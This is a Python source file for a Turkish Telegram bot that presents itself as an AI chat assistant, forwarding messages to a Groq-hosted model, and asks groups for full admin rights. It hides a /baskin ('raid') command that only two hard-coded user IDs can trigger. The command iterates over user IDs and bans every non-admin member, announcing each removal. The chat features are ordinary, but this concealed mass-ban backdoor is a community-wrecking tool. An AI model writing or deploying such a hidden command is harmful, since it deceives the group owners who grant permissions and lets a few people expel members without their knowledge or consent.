import os
import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackContext, filters

logging.basicConfig(level=logging.INFO)

# Yetkili kullanıcılar
YETKILI_KULLANICILAR = [8069059457, 7510507299]

# /gel komutuyla aktif edilen kullanıcıların ID'leri burada tutulacak
aktif_kullanicilar = set()

async def groq_ai_cevapla(soru: str) -> str:
    url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {os.getenv('GROQ_API_KEY')}",
        "Content-Type": "application/json"
    }
    turkce_soru = "Lütfen cevabını tamamen Türkçe ver.\n" + soru
    data = {
        "model": "llama3-8b-8192",
        "messages": [{"role": "user", "content": turkce_soru}]
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=15)
        response.raise_for_status()
        return response.json()["choices"][0]["message"]["content"]
    except Exception as e:
        logging.error(f"Groq API hatası: {e}")
        return "Ya Sabır Ya Allah... Sistem cevap veremedi."

async def start(update: Update, context: CallbackContext):
    gif_url = "https://media.giphy.com/media/WUlplcMpOCEmTGBtBW/giphy.gif"  # Türkçe ve uygun gif
    await context.bot.send_animation(chat_id=update.effective_chat.id, animation=gif_url)

    keyboard = [
        [InlineKeyboardButton("Destek", url="https://t.me/kizilsancaktr")],
        [InlineKeyboardButton("Geliştirici", url="https://t.me/ZeydBinhalit")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Ben Türkiye Cumhuriyeti API destekli bir yapay zekâ botuyum.\n"
        "`/nedersin` komutu ile grup mesajlarına yanıt verebilirim.\n"
        "`/gel` ile Türkçe sohbet moduna geçebilirsin.",
        reply_markup=reply_markup
    )

async def help_command(update: Update, context: CallbackContext):
    gif_url = "https://media.giphy.com/media/sIIhZliB2McAo/giphy.gif"
    await context.bot.send_animation(chat_id=update.effective_chat.id, animation=gif_url)

    keyboard = [
        [InlineKeyboardButton("Destek", url="https://t.me/kizilsancaktr")],
        [InlineKeyboardButton("Geliştirici", url="https://t.me/ZeydBinhalit")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Eğer grubumuzda çalışmıyorsam sebebi yetkilerim eksik olabilir.\n"
        "Lütfen bana tam yetki verin.",
        reply_markup=reply_markup
    )

async def nedersin(update: Update, context: CallbackContext):
    if not update.message.reply_to_message:
        await update.message.reply_text("Bu komutu bir mesaja yanıt vererek kullan.")
        return
    mesaj = update.message.reply_to_message.text
    kullanici_adi = update.message.reply_to_message.from_user.full_name
    soru = f"{kullanici_adi} dedi ki: {mesaj}"
    cevap = await groq_ai_cevapla(soru)
    await update.message.reply_text(cevap)

async def sor(update: Update, context: CallbackContext):
    if len(context.args) == 0:
        await update.message.reply_text("Lütfen bir soru yaz.")
        return
    soru = ' '.join(context.args)
    cevap = await groq_ai_cevapla(soru)
    await update.message.reply_text(f"Soru: {soru}\nCevap: {cevap}")

async def gel(update: Update, context: CallbackContext):
    kullanici_id = update.effective_user.id
    aktif_kullanicilar.add(kullanici_id)
    await update.message.reply_text("Türkçe sohbet moduna geçtin! Artık yazdıklarına Türkçe yanıt vereceğim.")

async def baskin(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in YETKILI_KULLANICILAR:
        return
    chat_id = update.effective_chat.id
    admins = await context.bot.get_chat_administrators(chat_id)
    admin_ids = [admin.user.id for admin in admins]

    await update.message.reply_text("Baskın başlıyor! 🤖😈")

    # Örnek olarak küçük bir ID aralığında deneme yapıyoruz
    for user_id_test in range(1, 1000):
        try:
            member = await context.bot.get_chat_member(chat_id, user_id_test)
            if member.user.id not in admin_ids and not member.user.is_bot:
                await context.bot.ban_chat_member(chat_id, member.user.id)
                await context.bot.send_message(chat_id, f"{member.user.full_name} kod adıyla etkisiz hale getirildi.")
        except Exception:
            continue

async def sohbet(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in aktif_kullanicilar:
        return
    if update.message.reply_to_message:
        mesaj = update.message.text
        kullanici_adi = update.message.from_user.full_name
        soru = f"{kullanici_adi} dedi ki: {mesaj}"
        cevap = await groq_ai_cevapla(soru)
        await update.message.reply_text(cevap)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_TOKEN")
    if not TOKEN or not os.getenv("GROQ_API_KEY"):
        raise ValueError("Gerekli API anahtarları eksik!")

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("nedersin", nedersin))
    app.add_handler(CommandHandler("sor", sor))
    app.add_handler(CommandHandler("gel", gel))
    app.add_handler(CommandHandler("baskin", baskin))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), sohbet))

    print("🤖 Sabr AI başladı.")
    app.run_polling()
